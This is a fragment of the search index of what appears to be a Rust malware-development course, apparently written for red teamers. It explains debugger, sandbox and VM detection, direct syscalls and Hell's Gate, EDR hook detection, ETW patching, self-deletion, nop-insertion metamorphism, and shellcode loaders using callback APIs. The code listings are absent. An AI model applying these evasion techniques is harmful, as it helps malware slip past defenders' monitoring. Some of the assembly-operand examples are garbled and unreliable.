displayed:\n\n","id":"http://127.0.0.1:1111/evasion/anti-debug-with-isdebuggerpresent/","title":"IsDebuggerPresent"},"http://127.0.0.1:1111/evasion/anti-debug-with-ptrace/":{"body":"In this section, we'll look at how to protect ourselves against programs that attempt to dynamically analyze our malware (debuggers, EDRs, etc.) on Linux.\nOn Linux, the ptrace system call allows you to attach yourself to a process and control its execution, modify its memory space and consult its registers. It is used by debuggers such as GDB. Attaching to a process with this system call is called 'tracing'.\nIt's important to remember that a process can only be traced by a single tracer, as any new tracing attempt will return a \"Operation not permitted\" error.\nIn this section, we're going to use a self-tracing technique. If we manage to trace ourselves, then other programs won't be able to trace us, and if we don't manage to trace ourselves, this means that a program is already doing so (if our program is launched with GDB, for example) and we quit immediately.\nTo do this, we're going to use the Nix library with the ptrace feature:\n\nNix wraps the various parameters available in ptrace in separate functions provided in the nix::sys::ptrace module.\nWe're going to use the traceme function.

This contains process PIDs in the form of folders, and in each of these folders we have the comm file containing the command used to launch the process.\nFor optimal detection, we'll compare process names at the bottom of the case:\n\nWindows🔗\nOn Windows, we'll use the following process list:\n\nThis list includes guest additions for VirtualBox and VMware, as well as tools such as tcpview and process explorer.\nThe program to retrieve the process list and compare it with the list above is as follows:\n\nThis function works as follows:\n\nThe Windows API function CreateToolhelp32Snapshot is used, with the constant TH32CS_SNAPPROCESS as parameter. This function requests a snapshot of the list of processes currently running on the system. The result is stored in the variable toolhelp_snapshot_process as a chained list of PROCESSENTRY32.\nAn empty PROCESSENTRY32 structure is created, which will contain information on a process. This structure will be successively filled with values from the previously returned chained list.\nWe use the Process32First function to retrieve the first value from the chained list and place it in the process_entry variable.\nWe then retrieve the process name and check whether it's in the list of processes we're looking for.\nWe then use the Process32Next function to retrieve the next process in process_entry. If Process32Next returns an error, this indicates that the end of the list of running processes has been reached.\n\nMAC Addresses🔗\nTo detect whether we're in a virtual machine, we're going to use the fact that the first 3 bytes of a MAC address identify the card designer. This identifier is called the Organizationally Unique Identifier or OUI, and the list of OUI's is publicly available (Wireshark has a page for searching this list).\nIn this case, we'll use the following OUI list for Windows and Linux:\n\nLinux🔗\nOn Linux, we can retrieve the list of interfaces on a machine using the /sys/class/net file system. In this folder we have a folder for each interface, and in each of these folders is the address file, which contains the MAC address of the interface.\nHere's the function that reads MAC addresses and compares them with the list defined above:\n\nThis function reads the folders in /sys/class/net to retrieve the interfaces, extracts the address of each of them and checks whether the first 3 bytes are in the previous MAC list.\nWindows🔗\nThe Windows API makes it easy to retrieve the list of network interfaces using the GetAdaptersInfo function. This function returns a chained list of IP_ADAPTER_INFO containing interface information (including MAC address).\nHere's the code using this function:\n\nThe preceding code retrieves the list of interfaces using the GetAdaptersInfo function. If this function returns an error, we display the error message by retrieving it using the FormatMessageA function.\nWe then go through the chained list of interfaces, retrieving the MAC address from the IP_ADAPTER_INFO structure, and compare the first 3 bytes formatted as strings with the OUI's in the OUI list we're looking for.\nCPUID🔗\nThe last method in this section uses the CPUID instruction available on x86 and x64 to find out whether the system is virtualized, and if so, the name of the hypervisor.\nThis instruction retrieves various information about the processor, which is written to the EBC, ECX and EDX registers. The type of information requested is controlled by the EAX register (or RAX on x64, although only the first 32 bits are used).\nIn this section, we'll retrieve a flag indicating whether the system is virtualized and the name of the hypervisor.\nFollowing tests, these functionalities do not work optimally on Windows.\nFor example, the virtualization flag returns true if a hypervisor is present on the system, regardless of whether the system is virtualized or not, and is therefore only used on Linux.\nAs this method uses information provided by the processor, its implementation functions are not OS-dependent.\nVirtualization flag🔗\nThe virtualization flag is present at the 31st bit of RCX with RAX set to 1 when calling CPUID.\nHere's the function that retrieves the virtualization flag:\n\nThe following function uses the asm macro to set RAX to 1, using CPUID. To retrieve the value of RCX from this macro, we copy this value into register R8 and retrieve it from variable res with out(\"r8\") res.\nFinally, the bit value is retrieved using a Boolean operation.\nHypervisor name retrieval🔗\nThe RAX value for retrieving the hypervisor name is 0x40000000. The hypervisor name is returned as a small byte in the EBC, ECX and EDX registers.\nThis feature works differently on Windows: it returns whether a hypervisor is installed on the system, which is often the case after several tests. The hypervisor returned is Hyper-V.\nHere's the list of hypervisors we're looking for:\n\nAnd the function that retrieves the hypervisor name and checks whether it's in the previous list:\n\nThis code calls CPUID with RAX set to 0x40000000, then retrieves the EBC, ECX and EDX registers from variables part1, part2 and part3 respectively.\nThen, for each of these variables, we retrieve its value from the little loop and transform the result into a character string.\nWe then check whether the result is in the list of hypervisors we're looking for.\nNote that on Windows, the name of the installed hypervisor is returned if we are not virtualized.\nResult🔗\nUsing the various functions seen in this section, we have the following program:\n\nAs virtualization flag retrieval doesn't always work as expected (giving true if a hypervisor is installed and true if our program is virtualized), the cpuid_check function doesn't use this feature:\n\nWhat's more, since Windows can return the name of the hypervisor installed without being virtualized, we don't fully trust this feature. We therefore rely on the other features to confirm that we are in a sandbox.\nHere are some screenshots of the program running on the various possible environments:\nLinux VM:\n\nLinux barebone:\nWindows VM:\n\nWindows barebone:\n\n","id":"http://127.0.0.1:1111/evasion/detect-sandbox/","title":"Detect sandbox"},"http://127.0.0.1:1111/evasion/direct-syscalls/":{"body":"In this part of the course, we'll look at how to interact directly with the Windows and Linux operating system kernels to escape the surveillance of security solutions.\nSystem calls are essential interfaces between processes and the operating system kernel for the purpose of interacting with system resources.\nHere is a diagram from RedHat:\n\nIn concrete terms, a system call generally consists of two assembly instructions:\n\nOne to set the system call number in the rax register\nThen one to trigger the system call with the syscall instruction.\n\nTo set the system call arguments, this is generally done via other registers (rdi, rsi, etc.) on Linux and directly on the stack on Windows, upstream of the syscall instruction.\nWe use them constantly without realizing it, because we use libraries that serve as interfaces for these system calls, notably \"libc\" or the \"Windows API\".\nIn this course, we'll look at how to call them without going through these libraries, whose calls are monitored by security solutions.\nTo simplify our example, we'll demonstrate the use of a system call with the following program:\n\nLinux🔗\nThe system calls on Linux are the easiest to use and the most documented.

However, neither of these solutions is very practical.\nTo overcome this problem, we will dynamically retrieve our system call numbers using the \"Hell's Gate\" technique, initially published by am0nsec. This technique simply builds on the other two techniques we've seen, direct system calls and hook detection.\nImplementation of Hell's Gate Technique🔗\nFor our implementation of this technique, similar to hook detection, we will retrieve the address of the \"Nt*\" function in the \"ntdll.dll\" module to read the opcodes contained in the function. Instead of looking for the pattern \"mov r10, rcx; mov eax, XX\", we will only retrieve the number XX placed in \"eax\", which is a two-byte integer.\nHere is the Rust code to retrieve the system call number for \"NtTerminateProcess\":\n\nNext, we need to execute our system call as in our direct system call course, but with the peculiarity of inserting our system call number.\nTo do this, we will need to adapt the content of our assembly code to take the system call number as an argument. We will reuse an implementation from memN0ps:\n\nHere, our do_syscall function takes as arguments the system call number, the number of arguments the system call takes, and then the actual arguments.\nIt will save the values of the rdi and rsi registers on the stack, then rearrange the proper values in the correct registers. First, it places the system call number in rax, then places the first four arguments in their respective registers according to the fastcall convention: rcx, rdx, r8, and r9. If there are more than four arguments, the others are placed in reverse order on the stack.\nFull Example\nNow, let's assemble everything and reproduce the example of displaying \"You shouldn't see me\" after calling \"NtTerminateProcess\" to demonstrate the functionality of our technique:\n\nWe observe the program execution with success:\n\nConclusion🔗\nYou can now use the direct system call technique without worrying about updating the number with each Windows update.\nHell's Gate is a basic technique but still faces a constraint: if the function is hooked by an EDR, it is no longer possible to retrieve the system call number. This is why subsequent techniques such as \"Halos Gate\" and \"Tartarus Gate\" were published. These techniques bypass this constraint by searching for a neighboring function that is not hooked to recalculate the number from it. Unfortunately, we will not cover these techniques in this course, but you now have the basics of their functioning.\n","id":"http://127.0.0.1:1111/evasion/hells/","title":"Hell's Gate"},"http://127.0.0.1:1111/evasion/hook-detection/":{"body":"This technique is specific to Windows, and involves the detection of hooks on Windows API functions by security solutions.\nA hook is a piece of code inserted at the beginning of a function normally used in a dynamic library, in order to steal its execution flow. This small feature is used by security solutions, notably EDRs, to monitor calls to these functions and detect their malicious use.\nOn Windows, EDRs generally place their hooks on \"ntdll.dll\" functions, as this is the dynamic library responsible for interfacing with all Windows system calls.\nHere's a diagram of all the functions executed behind the Windows API \"OpenProcess\" function call, by Alice Climent-Pommeret:\n\nSo, in this execution chain, it's the \"NtOpenProcess\" function that's hooked by the EDRs.\nIf we disassemble the function with WinDgb on a system without EDRs, we observe the following:\n\nIf you've just completed the course on direct system calls, you'll be familiar with this instruction set. Here we see syscall number 38 (26h).\nNow, let's take a look at some examples of what the assembly instructions for a function in \"ntdll.dll\" look like with an EDR:\n\n\nHere are two examples of the contents of a function hooked by an EDR. You can see the appearance of a \"jmp\" instruction to code belonging to the EDR.\nWe can see that the hooking techniques are not necessarily exactly the same, but the paterne we find is that it rewrites over the two instructions \"mov R10, rcx\" and \"mov eax, XX\".\nSo, we're going to rely on the presence of these two instructions without them being corrupted to determine whether the function is hooked or not.\nIn our example, we'll check whether the \"NtOpenProcess\" function is hooked:\n\nHere, we start by defining the list of opcodes representing the start of the \"uncorrupted\" functions.\nNext, we use the \"GetModuleHandleA\" and \"GetProcAddress\" functions to retrieve the address of the \"NtOpenProcess\" function.\nFrom this function address, we'll read the first four bytes and store them in our \"stub\" variable, converting the function pointer into a byte pointer.\nThen all we have to do is compare our stub with our witness variable containing the valid bytes, to determine whether the function is hooked or not.\n\n\nConclusion🔗\nYou now have all you need to dynamically determine whether a function is hooked. Several implementations of this technique involve iterating over all the functions in the \"Export Address Table\" of the \"ntdll.dll\" to enumerate all hooked functions.\nFor your malware, I advise you to check the functions you intend to use in advance, then if they are being monitored, you can opt for direct system calls or unhooking techniques, which unfortunately we won't be looking at in this course.\n","id":"http://127.0.0.1:1111/evasion/hook-detection/","title":"Hook detection"},"http://127.0.0.1:1111/evasion/patch-etw/":{"body":"To detect potential threats, EDRs can collect information on a Windows system. To retrieve this information, EDRs use ETW (Event Tracing for Windows). ETW is an event-tracking mechanism built into Windows. It is a function for tracing and logging events triggered by applications in user mode and drivers in kernel mode, in a log file. Events can be consumed in real time or from a log file. For example, events can be consumed to debug an application.\nIn this course, we'll be looking to develop a patch to bypass the ETW function. This will prevent our malware, for example, from being detected by EDRs. Contrary to popular belief, ETW is not that difficult to bypass.\nFirst of all, you need to know that in user mode, ETW-related functions have been implemented in ntdll.dll and that ETW can be bypassed during the process.\nWith this information and by disassembling ntdll.dll, we can see that the EtwEventWrite function is commonly called when ETW is used by security products.\nAccording to recent research, the EtwEventWrite function can be patched by returning a simple return when the function is called. Adam Chester has produced some very interesting documentation on the subject (https://blog.xpnsec.com/hiding-your-dotnet-etw/).\nSo we're going to develop a function in Rust, which will enable us to patch the EtwEventWrite function. This function can then be added to the code of an illegitimate program to prevent the creation of ETW events, for example.\nTo do this, you'll need to retrieve the handle of the ntdll.dll, and then the address of the EtwEventWrite function. In Rust, this can be done using the GetModuleHandleA and GetProcAddress functions of the windows crate. To save time later on, I'm going to create a path variable containing an array with an immediate return instruction (ret).\n\nNext, we'll try to change the memory permissions at the address of the EtwEventWrite function to enable writing. This step is necessary because we need to be able to obtain write permissions temporarily, to enable the program to write to the location where the EtwEventWrite function is stored in memory.\n\nNow that we have the right to write to memory at the address of the EtwEventWrite function, we'll write a return instruction at the address of the EtwEventWrite function. This instruction replaces the start of the function, resulting in immediate exit without execution of the rest of the function. You can also use the WriteProcessMemory function in the windows crate.\n\nAll that's left is to restore memory rights to their original state, after our patch has been written. We can reuse the VirtualProtect function to do this.\n\nYou can add this function to your program to patch the ETW. In the code, you'll find an example of a practical case with the ETW function implemented and working, as well as the function itself.\n","id":"http://127.0.0.1:1111/evasion/patch-etw/","title":"Patch ETW"},"http://127.0.0.1:1111/evasion/query-wmi/":{"body":"The purpose of this section is to present a Rust program that can serve as a basis for executing WMI Queries.

Our main objective will be to highlight the fundamental skills needed to think and act like a malicious actor in the context of IT security.\nIt is important to note that the content of this course will focus exclusively on the offensive dimension of IT security. We will not be looking at malware analysis or detection. However, to assess the effectiveness of our own malware, we will use various malware detection solutions.\nIn the course of this exploration, we'll be taking a deep dive into the Rust programming language, renowned for its robustness and security. This will enable us to understand how to design malicious programs while deepening our knowledge of the underlying mechanisms of programming.\nBe prepared to push back the boundaries of your knowledge while increasing your awareness of the ethical and legal implications of these practices.\n\nWhat's a malware ?🔗\nMalware, which is short for \"malicious software\", is a program designed to cause damage to a computer system.\nMalware is generally created by malicious individuals, and its most common motivations are as follows:\n\nIntelligence and intrusion: Used to extract data such as emails and internal information from companies or individuals, with a particular focus on sensitive data such as passwords.\nDisruption and extortion: Some malware locks down networks and computers, rendering them completely unusable. When these programs take a machine hostage in exchange for a ransom, they are known as ransomware. Malicious individuals demand payment to decrypt the data and make the machine operational again.\nDestruction or vandalism: Other malware aims to destroy computer systems, causing damage to the network infrastructure and consequent financial losses.\nTheft of computing time: Some malware uses the computing power of infected machines to run botnets, cryptomining programmes or to send spam.\n\n\nWhy develop your own malwares ?🔗\nAs part of a red team exercise, penetration test or security audit, a penetrator[6] uses automated tools. The common practice is to use existing tools, whether open-source such as Metasploit or proprietary such as Cobalt-Strike, to enable automated control of target and compromised machines.\nHowever, this raises a major problem. There are risks involved in running programs whose instructions we don't control on our customers' machines. We could be faced with unforeseen behaviour, or even worse, the execution of harmful code hidden either by the publisher itself or by a third party through a provisioning attack (a computer attack on a supplier with lesser security, which enables the target's protections to be bypassed). What's more, most offensive tools are now well known to detection systems such as anti-virus or EDRs, which makes it almost impossible to use them without being detected, especially when using scripts or programs available on GitHub.\nIn the case of open-source tools, it is certainly possible to read the entire code, but this can be complex. The code may be written in a language that is not part of our expertise, or the programme may be riddled with bad practices that make it difficult to decipher.\nIt is also possible to use malware development to raise the level of our services and offer malware similar to that used by real attackers. This approach offers greater control over our actions and a complete understanding of the tool, with the advantage of increasing our chances of going undetected and adapting to each infrastructure on which we carry out an attack.\nHowever, it is essential to remember that this practice must be carried out under strict supervision and rigorous control, in compliance with cybercrime legislation, obtaining the appropriate authorisations from the parties concerned, with great caution and in strict compliance with the laws (and ethics) in force.\n\nWhy develop your malwares in Rust ?🔗\nIn general, offensive tools are developed in programming languages such as C, C++, Python or Java, and more recently in Go. However, each of these languages has limitations that make them less than ideal for the task. It's often more complex to write robust programs in C or C++, Python can be slow, and its weak typing makes it less suitable for large programs. Java depends on a heavy execution environment that may not meet all the requirements when developing malware.\nThis is where Rust, a new programming language, comes in:\nRust is a modern system programming language renowned for its advantages in terms of security and memory management performance. Developed by Mozilla, Rust combines the low-level control of languages like C and C++ with advanced memory management features that prevent common programming errors, such as null pointer dereferences and data races between threads.\nIts ownership and borrowing system applies strict rules at compile time, guaranteeing secure code without the need for a garbage collector. This memory management mechanism automates the release of borrowed memory, relieving developers of this task.\nThere are many advantages to developing malware in Rust:\n\n\nSecurity and Robustness: Rust aims to minimise common programming errors, which can result in malware that is more stable and less prone to unforeseen problems.\n\n\nPerformance: Rust offers performance comparable to that of low-level languages such as C and C++, which is crucial for the development of malware that exploits vulnerabilities or carries out sophisticated attacks.\n\n\nConcurrency and parallelism: If your malware requires the simultaneous manipulation of several processes, Rust offers built-in mechanisms for managing concurrency and parallelism in complete security.\n\n\nAnti-reverse engineering: Due to its relative rarity as a language of choice for malware, analysing binaries written in Rust is more complex than analysing binaries written in C or other more common languages.\n\n\nCross-platform: Rust greatly simplifies cross-platform development, making it possible to write platform-specific code.\n\n\n","id":"http://127.0.0.1:1111/home/","title":"Malware developpement in Rust"},"http://127.0.0.1:1111/obfuscation/":{"body":"","id":"http://127.0.0.1:1111/obfuscation/","title":"Obfuscation"},"http://127.0.0.1:1111/obfuscation/auto-remove/":{"body":"Self-deletion is a feature that some malware can incorporate into their code. This feature enables malware to remove or hide its own presence after having accomplished its main mission, or to avoid detection by security tools.\nThere are several ways to proceed, and they differ according to the platform. First of all, we're going to create the following tree structure, so that we can call up our self-deletion functionality whether we're on Linux or Windows (as seen in the cross-platform section):\n\nLinux🔗\nOn Linux it's pretty easy, just get the relative path of the executable and delete it. To do this, create the file :\n# src/linux/lib.rs\nA function named :\ndisappear()\nThis function uses the :\n\nFrom the crate: std\nThese functions retrieve the executable's relative path and remove it.\nThe result is :\n\nNow in the file :\nsrc/linux/mod.rs```\nIn order to use the :\ndisappear()\nIn the :\nsrc/main.rs```\nYou need to add the following code:\n\nWindows🔗\nNow for the Windows part, it's going to be more complicated, as Windows prevents the deletion of a file while it's running.\nTo enable self-deletion on Windows, you'll need to take the following steps:\nOpen a HANDLE on the running process with DELETE access.\nRename the main file stream, :$DATA, to :whatyouwant.\nClose the HANDLE.\nOpen a HANDLE again on the running process with DELETE access, but this time set the DeleteFile flag of the FileDispositionInfo class to TRUE.\nClose the HANDLE to trigger file disposition.\nThe file is deleted.\nYou can't delete a mapped stream, but deleting a main stream also deletes the others, so that's what these steps are all about.\nHere's a list of all the libs you'll need:\n\nSo we'll create in :\n\nThe function :\n\nThis makes :\n\nIn the above code, we start by initializing the placeholder that will be used to rename the main file stream. Next, we retrieve the absolute path of the executable as a String.\nAfter preparing the necessary variables, we'll create a :\n\nThis will be used to open a HANDLE on the running process with DELETE access.\nTo do this, you can use the :\n\nIt is used to create, open or modify a file or device. It supports several operations, such as reading, writing and accessing specific attributes.\nHere's an example, to open a HANDLE on the running process with DELETE access:\n\nIn this function, we start by converting the path variable of type &amp;str'' to Vec&lt;u16&gt;, and then retrieve the raw vector pointer. And construct a raw PCWSTR pointer, for the lpfilename parameter of CreateFileW. Then we add the other necessary parameters to CreateFileW.\nOnce you've opened a HANDLE on the running process with DELETE access, you can perform step 2 by creating a :\n\nThis will rename the main file stream, :$DATA, to :whatyouwant, here's an example of code to do this:\n\nFirst of all, when creating the function, be sure to adapt the placeholder type to the size of the placeholder variable created in the disappear function.\nSo this function basically changes the main file stream, :$DATA, to the placeholder. The placeholder variable must be converted so that it can be passed as a parameter with the correct type in the FILE_RENAME_INFO structure, and then added as a parameter in the SetFileInformationByHandle function. All this will rename the main file stream, :$DATA by the placeholder and return the result.\nWe can now move on to step 3 by closing the HANDLE, which is done very simply in Rust with this function for example:\n\nSimply call the :\n\nAnd add our previously used handle.\nWe can then directly reopen a HANDLE on the running process, with DELETE access afterwards, using the function :\n\nwhich we created earlier.\nFor the last 2 steps, set the DeleteFile flag of the FileDispositionInfo class to TRUE and reuse the :\n\nWe'll create a final function:\n\nThis function takes as its parameter the handle created just before, then creates a variable that uses the Boolean DeleteFile set to 1, in the FILE_DISPOSITION_INFO structure. So that this variable can be set as a parameter in the function SetFileInformationHandle.\nReuse the :\n\nto close this HANDLE.\nNow here's an example of our function:\n\nIn file :\n\nThe file Cargo.toml :\n\nThis Cargo.toml file contains all the configuration needed to use all the code seen above.\nThe main.rs file:\n\nWe use the cfg tags to use the right mods and crates according to the operating system in use.\nThen all we have to do is call our disappear() function and display the error if it fails.

This technique is therefore much more effective at evading antivirus detection.\nIn concrete terms, metamorphism means altering the program's assembly instructions in a different way each time the binary is compiled, while achieving the same thing in the end.\nFor our example of metamorphism implementation, we're going to take advantage of the capabilities of Rust and its compiler, to develop a \"macro\" that will be applied to our functions to insert between each code instruction, a random number, between 1 and 10, of \"nop\" opcodes (an assembler instruction that performs no action\").\nA macro in Rust is similar to a macro in C: it's \"code\" executed during pre-compilation to reformat the code before it's compiled. In our case, we're going to develop what Rust calls a \"procedural\" macro, which is different from the \"declarative\" macros you may have seen with macro_rules!() and which we won't be looking at here.\nTo do this, we'll need to create two projects, one to develop the macro in a separate library, and one to demonstrate the use of the macro:\n\nWe'll start with the macro code, first with this configuration in the \"Cargo.toml\" file:\n\nThe syn, quote and proc-macro2 dependencies are required to write a procedural macro, and rand to implement random functionality.\nThen the macro source code:\n\nOur nopper function is defined as an attribute macro via proc_macro_attribute.

Each instruction generally corresponds to a specific hardware operation.\nThe benefits of assembler with Rust🔗\nWriting assembler code in Rust is interesting for a number of reasons. First of all, for development purposes, there's great interest, as you can manipulate low-level instructions while taking advantage of Rust's modern features. Rust's clear, expressive syntax simplifies the writing of assembler instructions, making it more accessible even to those who are not assembler experts.

In the case of the Linux x86-64 system API, the arguments for syscall :\nwrite\nare generally passed in the rdi, rsi, rdx, r10, r8 and r9 registers, in that order.\nIn our assembly code, the order of the arguments conforms to this convention:\n\nIn assembly code, loading the pointer to the message :\nlea rsi, [message]\nAnd the length of the message:\nmov rdx, len\nPerformed before the system call\nsyscall\nIn accordance with Linux x86-64 convention.\nHowever, the situation is different in Rust code. In the case of the :\nasm!\nConstraints:\nin\nSpecify operands that are inputs to the assembly instruction, but this does not necessarily determine the order of evaluation. In your Rust code, in constraints are specified after syscall:\n\nThe evaluation order can change depending on the compiler and the optimizations performed. This can sometimes lead to a change in the apparent order of in constraints compared to assembly code. If we take a closer look :\n\"mov rax, 1\"\nThis instruction loads the syscall number into rax.\n\"mov rdi, 1\"\nThis instruction loads the stdout file descriptor into rdi.\n\"syscall\"\nThis instruction performs the syscall write. At this point, the values in rsi and rdx will be used as parameters for syscall.\nin(\"rsi\") message.as_ptr()\nThis constraint specifies that rsi is an input and loads the address of the beginning of the message.as_ptr() string into rsi. This is important because rsi is an input register for syscall.\nin(\"rdx\") message.len()\nThis constraint specifies that rdx is an input and loads the length of the message.len() string into rdx. It's also crucial because rdx is used as an input parameter for syscall.\nHowever, as long as the constraints are correctly specified and the values are correctly loaded into the registers before syscall, the result should be correct. It's important to note that specifying in constraints after syscall in Rust code doesn't affect the actual order in which operations are evaluated, and the compiler will ensure that the necessary values are correctly loaded before the system call.\nSo here's our final program:\n\nFinally, we can see that calling assembler in Rust is pretty easy. You just need to pay attention to the evaluation order and the conventions of the system APIs. To play with variables, use the various operands available in Rust:\nin, out, inout, inlateout, lateout, etc.\nThe in operand is used to specify that the values of the specified registers will be read by the assembler instruction. This means that the register values will be used as input for the assembler instruction.\nExample:\nasm!(\"mov $0, $1\" : \"=r\"(output) : \"r\"(input));\nThe out operand is used to specify that the specified register values will be written by the assembler instruction. This means that the register values will be modified by the assembler instruction and returned as output.\nExample :\nasm!(\"mov $0, $1\" : \"=r\"(output) : \"r\"(input));\nThe inout operand combines in and out. It specifies that the values of specified registers will be read as input and written as output by the assembler instruction.\nExample:\nasm!(\"add $0, $1\" : \"=r\"(result) : \"r\"(value));\nThe inlateout operand is similar to inout, but indicates that the write operation (out) can be delayed until the end of the asm! block.\nExample:\nasm!(\"add $0, $1\" : \"=&amp;r\"(result) : \"r\"(value));\nThe lateout operand is used to specify that the write operation (out) can be delayed until the end of the asm! block, without any initial read operation.\nExample:\nasm!(\"mov $0, $1\" : \"=&amp;r\"(output));\nIn these examples, $0, $1, etc. are substitution operands used to reference the register values specified in the operand list. The symbols \"=r\" and \"r\" define the type and access mode of the registers.\nAll the code seen in this course is available as a file on the following page.\n","id":"http://127.0.0.1:1111/shellcode/call-assembly-in-rust/","title":"Call assembly in Rust"},"http://127.0.0.1:1111/shellcode/exec-shellcode-in-local/":{"body":"Local shellcode execution🔗\nLocal shellcode execution, where the term \"shellcode\" refers to a small piece of independent code, in the form of an opcode suite, specifically designed to be injected and executed in the memory of a running process. Unlike traditional software, which is designed to perform specific tasks, shellcode is used for malicious purposes, exploiting a system's vulnerabilities to gain unauthorized access or control.\nThe term \"local\" in local shellcode execution means that the code is intended to run on the same process itself, as opposed to remote execution where an attacker can deploy the code on another process, also known as code injection and which we'll see in the \"Evasion\" part of the course. Local shellcode execution involves exploiting the capabilities provided by the operating system, enabling an attacker to inject his own code directly into the process's memory space.\nSo, for us malware developers, shellcode execution in our programs can help us to trick security solutions and hide malicious code. This type of shellcode-executing program is called a \"loader\". To do this, we need two things: firstly, a shellcode PIC (for \"Position Independent Code\") to execute, of course, and secondly, a region of memory with read, write and, above all, execute permissions.\nIn this part of the course, we'll look at the different techniques for executing shellcode.\nWe'll use the following shellcodes as examples:\n\nLinux, which will execute a \"/bin/sh\" shell:\n\n\n\nWindows, which will execute a \"cmd.exe\" shell:\n\n\nRun in \".text\" section🔗\nThe \".text\" section is already executable by default, as this is the section that contains your binary code. This seems an appropriate place to execute shellcode, so let's see how we can place and execute shellcode in this section.\nHere's the code structure:\n\nSource:\n\nWe can see here that we're using the \"#[link_section = \".text\"]\" macro to insert our shellcode directly into the \".text\" section of our binary.\nWe then retrieve the shellcode address from memory and convert it into a function pointer that we can call.\nHere's how it works on Linux and Windows:\n\n\nThe good thing about this technique is that it's simple, cross-platform and requires no use of the operating system.\nThe \".text\" section is not writable, so we can't use any encoder to obfuscate our shellcode. Malicious code will therefore be quickly detected by security solutions.\nExecution in a dynamic allocation🔗\nExecuting shellcodes in dynamic allocations consists in allocating a block of memory with execution rights on the heap of our process, copying our shellcode into it, then directly calling this block of memory as if it were the code of a function.\nThis little trick requires calls to the operating system's APIs, so we'll divide this technique into two for Linux and Windows.\nLinux🔗\nTo execute shellcode in a dynamic allocation on Linux, we're going to use the \"libc\" module, which will enable us to interact directly with the \"mprotect\" system call, which will enable us to modify the permissions of a memory allocation that we're going to create using a simple instance of Rust's \"Box\". The aim here is to add the right to execute, which is not present by default.\nWe'll then retrieve the address of this allocation and convert it into a function pointer that we'll call.\n\n\nUnfortunately, we'll be using \"unsafe\" code here, as we'll be using a C-interfaced function for the \"mprotect\" system call, as well as direct manipulation of our Box pointer.\nWindows🔗\nTo execute shellcode in a dynamic allocation on Windows, we'll use exactly the same technique as on Linux.\nWe're going to use the \"windows\" module, which will enable us to interact directly with the \"VirtualProtect\" function, which fulfills the same mission as the \"mprotect\" system call on Linux, allowing us to modify the permissions of a memory allocation we're going to make using a simple instance of Rust's \"Box\". The aim here is the same: to add the right to execute, which is not present by default.\n\n\nWe have to use an \"unsafe\" block here too, for the same reasons as in the Linux example.\nThis technique is more interesting than most versions found on other resources, because firstly, we go through Rust's memory allocator instead of doing our own allocation, which is less suspicious. Secondly, at no point do we create a section with RWX permissions (read, write and execute), which is also very suspicious.\nExecution via callback function\nThe technique we're now going to use is a very interesting one for obfuscating the execution of our shellcode.\nIn the Windows API, there are functions that take a \"callback\" as argument, which are used to supply code managed by our program to an external dynamic library that we don't control.\nAn explanatory diagram by Microsoft summarizes how this works:\n\nThe technique we're going to use consists in giving the function pointer of our shellcode as a callback function, which will then be executed in a new thread.\nHere's a list, as exhaustive as possible according to our research, of the Windows API callback functions in question:\n\nCertEnumSystemStore\nCertEnumSystemStoreLocation\nCopyFile2\nCopyFileEx\nCreateThreadPoolWait\nCreateTimerQueueTimer_Tech\nCryptEnumOIDInfo\nEnumCalendarInfo\nEnumCalendarInfoEx\nEnumChildWindows\nEnumDateFormatsA\nEnumDesktopsW\nEnumDesktopW\nEnumDesktopWindows\nEnumDirTreeW\nEnumDisplayMonitors\nEnumFontFamiliesExW\nEnumFontFamiliesW\nEnumFontsW\nEnumICMProfiles\nEnumLanguageGroupLocalesW\nEnumObjects\nEnumPageFilesW\nEnumPropsEx\nEnumPropsW\nEnumPwrSchemes\nEnumResourceTypesExW\nEnumResourceTypesW\nEnumSystemCodePagesA\nEnumSystemCodePagesW\nEnumSystemGeoID\nEnumSystemLanguageGroupsA\nEnumSystemLocales\nEnumThreadWindows\nEnumTimeFormatsA\nEnumTimeFormatsEx\nEnumUILanguagesA\nEnumUILanguagesW\nEnumWindowStationsW\nEnumWindows\nEnumerateLoadedModules\nFiberContextEdit\nFlsAlloc\nImageGetDigestStream\nImmEnumInputContext\nInitOnceExecuteOnce\nLdrEnumerateLoadedModules\nLdrpCallInitRoutine\nOpenThreadWaitChainSession\nRtlUserFiberStart\nSetTimer\nSetupCommitFileQueueW\nSymEnumProcesses\nSymFindFileInPath\nSysEnumSourceFiles\nVerifierEnumerateResource\n\nYou're free to study the Microsoft documentation for the function you want to use.\nOr you can consult this Github repository, which contains sample implementations of some of these callback functions: https://github.com/aahmad097/AlternativeShellcodeExec .\nWe'll now develop an example with the \"EnumSystemGeoID\" function, based on our previous implementation of dynamic allocation:\n\nWith this technique, we can execute code much more unobtrusively, as these Windows API functions are rarely monitored by security solutions.\nConclusion\nYou now have all the tools you need to execute shellcode on your own processes. This will come in handy when you want to obfuscate pieces of code and escape static analysis by antivirus software.\nAs we'll see later on, this type of behavior is easily detected by EDR-based security solutions, which is why we'll be looking at how to evade detection in another part of this course.\n","id":"http://127.0.0.1:1111/shellcode/exec-shellcode-in-local/","title":"Execute shellcode in local process"},"http://127.0.0.1:1111/shellcode/generate-shellcode-for-linux/":{"body":"We're going to look at how to generate shellcode for Linux from code written in Rust.\nWe'll be basing ourselves on a technique developed by Sylvain Kerkour, which consists in producing completely independent code (PIC) and extracting the code from the binary with \"objcopy\".\nFor our example, we're going to develop a shellcode that will simply execute a shell with \"/bin/sh\". To do this, we're going to use the \"execve\" system call, the documentation for which can be found here: https://x64.syscall.sh/\nHere's the content of our Rust code:\n\nHere, we start by telling Cargo that we're going to compile our program without the standard library, which is essential if we're to obtain independent code.\nWe then rename our main function \"_start\", as this is the real entry point into Linux.\nNext, we call the \"syscall\" assembly instruction, placing the right values in the right registers according to the documentation:\n\nThe code is relatively simple, but now we need to fill in some additional configurations for Cargo to produce a valid binary:\n\nThese parameters tell Cargo to produce a PIC (Position Independent Code) and the linker to use the section layout configured in the \"shellcode.ld\" file:\n\nHere, we merge the \"rodata\" section, which contains the static variables, with the \"text\" section, which contains the code, so that our shellcode can read its variables independently.\nAll that remains is to compile our code to produce the shellcode, by compiling our program with the \"cargo build --release\" command, then we just have to extract the shellcode using the following command:\nobjcopy -O binary shellcode/target/release/shellcode shellcode.bin\nYou can then load the \"shellcode.bin\" file into your favorite loader:\n\nConclusion🔗\nNow you've got all you need to generate shellcode for Linux.\n","id":"http://127.0.0.1:1111/shellcode/generate-shellcode-for-linux/","title":"Generate shellcode for Linux"},"http://127.0.0.1:1111/shellcode/generate-shellcode-for-windows/":{"body":"We're going to take a look at shellcode generation by programming the code ourselves in Rust. This will give us greater flexibility than if we were to use shellcodes pre-made by 